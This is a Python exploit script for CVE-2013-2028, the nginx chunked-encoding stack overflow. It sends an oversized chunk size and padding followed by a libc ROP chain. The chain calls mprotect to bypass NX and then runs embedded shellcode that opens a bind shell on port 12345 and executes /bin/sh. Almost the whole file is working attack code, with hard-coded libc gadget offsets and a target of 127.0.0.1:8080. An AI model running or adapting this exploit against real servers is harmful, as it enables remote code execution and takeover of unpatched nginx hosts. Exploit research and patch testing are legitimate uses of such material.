# -*- coding: utf-8 -*-

###########################################################################################
# CVE-2013-2028
# Environment : NX
# Coded by dokydoky
###########################################################################################

import socket
import struct
from pwn import *

shellcode = (
    '\x6A\x29\x58\x6A\x02\x5F\x6A\x01\x5E\x99\x0F\x05\x52\xBA\x01\x01' +
    '\x01\x01\x81\xF2\x03\x01\x31\x38\x52\x6A\x10\x5A\x48\x89\xC5\x48' +
    '\x89\xC7\x6A\x31\x58\x48\x89\xE6\x0F\x05\x6A\x32\x58\x48\x89\xEF' +
    '\x6A\x01\x5E\x0F\x05\x6A\x2B\x58\x48\x89\xEF\x31\xF6\x99\x0F\x05' +
    '\x48\x89\xC5\x6A\x03\x5E\x48\xFF\xCE\x78\x0B\x56\x6A\x21\x58\x48' +
    '\x89\xEF\x0F\x05\xEB\xEF\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01' +
    '\x01\x01\x31\xD2\x52\x6A\x08\x5A\x48\x01\xE2\x52\x48\x89\xE2\x6A' +
    '\x68\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x2F\x73\x50\x6A\x3B\x58\x48' +
    '\x89\xE7\x48\x89\xD6\x99\x0F\x05'
)

# int mprotect(void *addr, size_t len, int prot);
#   shellcode address = 0x7fffffffdcc8 + 8
#   mprotect(0x7fffffffd000, 0x2000, 7)
#
# System call table of 'sys_mprotect' 
#   %rdi = unsigned long start = 0x7fffffffd000
#   %rsi = size_t len = 0x2000
#   %rdx = unsigned long prot = 7
#   %rax = 10

libc = 0x7ffff75be000	#/lib/x86_64-linux-gnu/libc-2.19.so
#
#chain = [
#    libc+0x00022b9a,	# pop rdi ; ret
#    0x7fffffffd000,	# addr
#    libc+0x0012d730,	# pop rsi ; ret
#    0x2000,		# len
#    libc+0x00001b92,	# pop rdx ; ret
#    0x7,		# prot
#    libc+0x0001b290,	# pop rax ; ret
#    0xA,		
#    libc+0x000c1d05,	# syscall ; ret
#    libc+0x0018dce3	# jmp rsp
#]
#ropchain = ''.join(struct.pack('<Q', _) for _ in chain)
#ropchain += shellcode

# start : rdi = (rsp >> 3) << 3
chain = [
    libc+0x0001b290,	# pop rax ; ret
    libc+0x0001b290,	# &(pop rax ; ret)
    libc+0x0011ed05,	# mov rdi, rsp ; call rax
    libc+0x0015fbe4,	# mov rax, rdi ; ret  

    libc+0x001180df,	# shr rax, 0x04 ; ret
    libc+0x001180df,	# shr rax, 0x04 ; ret
    libc+0x001180df,	# shr rax, 0x04 ; ret

    libc+0x0012e111,	# pop rbx ; ret 
    libc+0x0012ca09,	# &(pop r14 ; ret)
    libc+0x000cce17,	# mov rdi, rax ; call rbx

    libc+0x0012cc84,	# pop r15 ; ret
    libc+0x00022c00,	# &(pop rsi ; pop r15 ; ret)
    libc+0x0011dbd4,	# mov r13, rsp ; call r15
    libc+0x0004fc5a,	# &(ret)
    libc+0x0011dfe4,	# mov rcx, r13 ; call rbx
    libc+0x00035778,	# mov rax, rcx ; ret 

    libc+0x001a4890,	# shl rdi, 1  ; jmp qword [rax]
    libc+0x001a4890,	# shl rdi, 1  ; jmp qword [rax]
    libc+0x001a4890,	# shl rdi, 1  ; jmp qword [rax]
    libc+0x001a4890,	# shl rdi, 1  ; jmp qword [rax]
    libc+0x001a4890,	# shl rdi, 1  ; jmp qword [rax]
    libc+0x001a4890,	# shl rdi, 1  ; jmp qword [rax]
    libc+0x001a4890,	# shl rdi, 1  ; jmp qword [rax]
    libc+0x001a4890,	# shl rdi, 1  ; jmp qword [rax]
    libc+0x001a4890,	# shl rdi, 1  ; jmp qword [rax]
    libc+0x001a4890,	# shl rdi, 1  ; jmp qword [rax]
    libc+0x001a4890,	# shl rdi, 1  ; jmp qword [rax]
    libc+0x001a4890,	# shl rdi, 1  ; jmp qword [rax]
# end : rdi = (rsp >> 3) << 3 

    libc+0x0012d730,	# pop rsi ; ret
    0x2000,		# 0x2000
    libc+0x00001b92,	# pop rdx ; ret
    0x7,			# 7
    libc+0x0001b290,	# pop rax ; ret
    0xA,			# 10
    libc+0x000c1d05,	# syscall ; ret
    libc+0x0018dce3	# jmp rsp
]
ropchain = ''.join(struct.pack('<Q', _) for _ in chain)
ropchain += shellcode


ChunkSize = '8000000000000000'
data = "A"*5139 + ropchain + shellcode

payload = '''GET / HTTP/1.1\r
Host: 127.0.0.1:8080\r
Transfer-Encoding: chunked\r\n\r
{} {}'''.format(ChunkSize, data)

if __name__ == "__main__":
    HOST = '127.0.0.1'
    PORT = 8080

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST,PORT))
    s.sendall(payload)



